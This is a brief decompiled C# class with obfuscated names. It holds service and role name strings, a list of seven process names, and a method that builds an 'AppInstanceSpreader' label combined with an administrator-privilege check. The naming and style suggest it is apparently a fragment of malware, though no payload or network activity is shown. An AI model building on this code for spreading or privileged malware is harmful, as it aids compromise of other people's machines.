using System.Runtime.CompilerServices;
using System.Security.Principal;

namespace ns2;

internal sealed class Class1
{
	public static readonly string string_0 = "AppInstanceService";

	public static readonly string string_1 = "AppInstanceAdminRole";

	public static readonly string string_2 = "winvsp";

	public static readonly string string_3 = "_back";

	public static readonly string[] string_4 = new string[7] { "winvsp", "vspmem", "wmcsp", "svcvsp", "vspconsole", "dvm", "vspmng" };

	public static volatile bool bool_0 = true;

	[SpecialName]
	public static string smethod_0()
	{
		return "AppInstanceSpreader" + smethod_1();
	}

	private static bool smethod_1()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
